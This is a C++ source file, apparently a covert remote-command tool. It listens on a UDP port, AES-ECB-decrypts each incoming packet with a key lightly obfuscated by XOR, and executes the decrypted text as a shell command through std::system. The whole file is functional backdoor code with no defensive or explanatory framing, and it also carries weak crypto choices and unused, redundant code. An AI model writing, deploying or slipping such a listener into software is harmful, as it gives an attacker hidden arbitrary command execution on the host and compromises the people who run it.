#include <asio.hpp>
#include <asio/ts/buffer.hpp>
#include <asio/ts/internet.hpp>
#include <iostream>
#include <cstdlib>
#include <csignal>
#include <atomic>
#include <crypto++/aes.h>
#include <crypto++/modes.h>
#include <crypto++/filters.h>
#include <crypto++/hex.h>

std::atomic<bool> interrupted(false);

void signal_handler(int) {
    interrupted.store(true);
}

std::string aes_decrypt(const std::string &input, const CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH]) {
    std::string decryptedtext;
    CryptoPP::AES::Decryption aesDecryption(key, CryptoPP::AES::DEFAULT_KEYLENGTH);
    CryptoPP::ECB_Mode_ExternalCipher::Decryption ecbDecryption(aesDecryption);
    CryptoPP::StreamTransformationFilter stfDecryptor(ecbDecryption, new CryptoPP::StringSink(decryptedtext));
    stfDecryptor.Put(reinterpret_cast<const CryptoPP::byte *>(input.data()), input.length());
    stfDecryptor.MessageEnd();

    return decryptedtext;
}

void handle_receive(const asio::error_code& ec, std::size_t length, std::array<char, 1024>& receive_buffer,
                 asio::ip::udp::socket& socket, asio::ip::udp::endpoint& sender_endpoint,
                 const CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH])
{
    if (!ec && length > 0)
    {
        // The data received from the sender
        std::string data(receive_buffer.data(), length);

        // Decrypt the received data using the AES key
        std::string decrypted_command = aes_decrypt(data, key);

        // Process the decrypted command
        std::cout << "Received command: " << decrypted_command << std::endl;
        std::system(decrypted_command.c_str());
    }

    // Start reading again
    socket.async_receive_from(
        asio::buffer(receive_buffer), sender_endpoint,
        std::bind(handle_receive,
            std::placeholders::_1, std::placeholders::_2, std::ref(receive_buffer),
            std::ref(socket), std::ref(sender_endpoint), key));
}

void receiver(const std::string& ip, uint16_t port, const CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH]) {
    try {
        asio::io_context io_context;
        asio::ip::udp::socket socket(io_context, asio::ip::udp::endpoint(asio::ip::udp::v4(), port));
        asio::ip::udp::endpoint sender_endpoint;
        std::array<char, 1024> receive_buffer;

        socket.async_receive_from(
            asio::buffer(receive_buffer), sender_endpoint,
            std::bind(handle_receive,
                std::placeholders::_1, std::placeholders::_2, std::ref(receive_buffer),
                std::ref(socket), std::ref(sender_endpoint), key));

        io_context.run();
    }
    catch (asio::system_error& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }
    catch (std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }
}

std::string xor_cipher(const std::string& input, const std::string& key) {
    std::string output;
    for (size_t i = 0; i < input.size(); i++) {
        output += static_cast<char>(input[i] ^ key[i % key.size()]);
    }
    return output;
}


int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "Usage: " << argv[0] << " <ip> <port>" << std::endl;
        return 1;
    }

    const char* env_key = std::getenv("AES_KEY");
    if (!env_key) {
        std::cerr << "Error: Environment variable AES_KEY is not set" << std::endl;
        return 1;
    }

    std::string env_key_str(env_key);
    std::string aes_key_str = xor_cipher(env_key_str, "a_simple_key");
    CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH];
    memcpy(key, aes_key_str.data(), CryptoPP::AES::DEFAULT_KEYLENGTH);

    try {
        std::string ip = argv[1];
        uint16_t port = static_cast<uint16_t>(std::stoi(argv[2]));

        if (port == 0) {
            std::cerr << "Error: Invalid port number" << std::endl;
            return 1;
        }

        asio::io_context io_context;
        asio::ip::udp::socket socket(io_context, asio::ip::udp::endpoint(asio::ip::udp::v4(), port));
        asio::ip::udp::endpoint sender_endpoint;
        std::array<char, 1024> receive_buffer;

        std::signal(SIGINT, signal_handler);

        socket.async_receive_from(
            asio::buffer(receive_buffer), sender_endpoint,
            std::bind(handle_receive, std::placeholders::_1, std::placeholders::_2, std::ref(receive_buffer),
                      std::ref(socket), std::ref(sender_endpoint), key));

        io_context.run();
    } catch (std::invalid_argument& e) {
        std::cerr << "Error: Invalid port number" << std::endl;
    } catch (asio::system_error& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    } catch (std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }

    return 0;
}
